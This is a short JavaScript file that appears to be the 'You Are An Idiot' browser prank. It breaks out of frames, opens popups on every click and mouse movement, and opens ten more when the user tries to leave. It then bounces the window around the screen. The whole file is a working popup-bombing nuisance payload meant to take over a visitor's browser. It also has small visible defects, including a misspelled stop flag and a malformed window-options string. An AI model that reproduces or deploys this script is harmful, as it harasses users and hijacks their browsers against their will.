if (top.location != location) {
  top.location.href = location.href;
}
function reopen() {
  window.open(
    "popup.html",
    "",
    "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
  );
}
function spam() {
  for (var i = 0; i < 10; i++) {
    reopen();
  }
  return "You Are An Idiot!";
}
function init() {
  document.body.onclick = reopen;
  document.body.onmouseover = reopen;
  document.body.onmousemove = reopen;
  window.onunload = spam;
  window.onbeforeunload = spam;
  playBall();
  if (bookmark) {
    bookmark();
  }
  reopen();
  setTimeout(function () {
    window.close();
  }, 10000);
}
var xOff = 5,
  yOff = 5,
  xPos = 400,
  yPos = -100,
  flagRun = true;
function newXlt() {
  xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
  window.focus();
}
function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function newYup() {
  yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
}
function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function fOff() {
  flagrun = false;
}
function playBall() {
  xPos += xOff;
  yPos += yOff;
  if (xPos > screen.width - 175) {
    newXlt();
  }
  if (xPos < 0) {
    newXrt();
  }
  if (yPos > screen.height - 100) {
    newYup();
  }
  if (yPos < 0) {
    newYdn();
  }
  if (flagRun) {
    window.moveTo(xPos, yPos);
    setTimeout(playBall, 1);
  }
}
